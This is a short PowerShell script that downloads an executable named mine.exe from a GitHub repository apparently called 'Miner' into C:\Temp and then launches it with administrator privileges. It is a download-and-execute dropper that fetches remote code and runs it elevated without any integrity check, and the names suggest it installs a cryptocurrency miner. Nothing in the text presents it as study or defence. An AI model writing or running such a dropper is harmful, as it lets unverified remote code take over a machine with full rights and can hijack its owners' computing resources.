# Specify the GitHub raw file URL of the file you want to download
$FileUrl = "https://github.com/modded-soldier-9/Miner/raw/main/mine.exe"

# Specify the path where you want to save the downloaded file
$FilePath = "C:\Temp\mine.exe"

# Download the file from the GitHub raw URL
Invoke-WebRequest -Uri $FileUrl -OutFile $FilePath

# Check if the download was successful
if (Test-Path $FilePath) {
    # If the file was downloaded successfully, run it with administrator privileges
    Start-Process -FilePath $FilePath -Verb RunAs
} else {
    Write-Host "Failed to download the file."
}
